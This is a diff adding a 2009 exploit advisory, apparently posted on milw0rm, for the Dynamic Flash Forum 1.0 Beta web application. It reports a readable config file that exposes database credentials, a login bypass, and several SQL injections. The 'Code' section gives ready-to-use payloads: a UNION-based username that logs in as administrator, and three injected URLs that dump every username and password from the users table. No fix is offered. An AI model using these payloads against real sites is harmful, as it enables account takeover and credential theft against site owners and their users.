@@ -1,0 +1,96 @@
+*******   Salvatore "drosophila" Fresta   *******
+
+[+] Application: Dynamic Flash Forum
+[+] Version: 1.0 Beta
+[+] Website: http://df2.sourceforge.net/
+
+[+] Bugs: [A] Information Disclosure
+          [B] Authentication Bypass
+          [C] Multiple SQL Injection
+
+[+] Exploitation: Remote
+[+] Date: 09 Apr 2009
+
+[+] Discovered by: Salvatore "drosophila" Fresta
+[+] Author: Salvatore "drosophila" Fresta
+[+] Contact: e-mail: drosophilaxxx@gmail.com
+
+
+*************************************************
+
+[+] Menu
+
+1) Bugs
+2) Code
+3) Fix
+
+
+*************************************************
+
+[+] Bugs
+
+
+- [A] Information Disclosure
+
+[-] File affected: config.inc
+
+This file contains reserved informations such as
+the username and the password for connecting to
+the database. Using .inc extension only, the 
+content is visible.
+
+
+- [B] Authentication Bypass
+
+[-] Requisites: magic_quotes_gpc = off
+[-] File affected: login.php
+
+This bug allows a guest to bypass the authentication
+system and to login with administrator privileges.
+
+
+- [C] Multiple SQL Injection
+
+[-] Requisites: magic_quotes_gpc = off
+[-] File affected: viewprofile.php, viewmessage.php,
+viewthreads.php
+
+This bug allows a guest to execute arbitrary 
+queries.
+
+
+*************************************************
+
+[+] Code
+
+
+- [A] Information Disclosure
+
+http://www.site.com/path/config.inc
+
+
+- [B] Authentication Bypass
+
+Username: -1' UNION ALL SELECT 'password', 1, 'Administrator' FROM users%23
+Password: password
+
+
+- [C] Multiple SQL Injection
+
+http://www.site.com/path/viewprofile.php?userID=-1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,GROUP_CONCAT(CONCAT(username, 0x3a, password)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM users%23
+
+http://www.site.com/path/viewmessage.php?threadID=-1' UNION ALL SELECT NULL,NULL,NULL,NULL,GROUP_CONCAT(CONCAT(username, 0x3a, password)),NULL,NULL,NULL FROM users%23
+
+http://www.site.com/path/viewthreads.php?boardID=-1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,GROUP_CONCAT(CONCAT(username, 0x3a, password)) FROM users%23
+
+
+*************************************************
+
+[+] Fix
+
+No fix.
+
+
+*************************************************
+
+# milw0rm.com [2009-04-09]
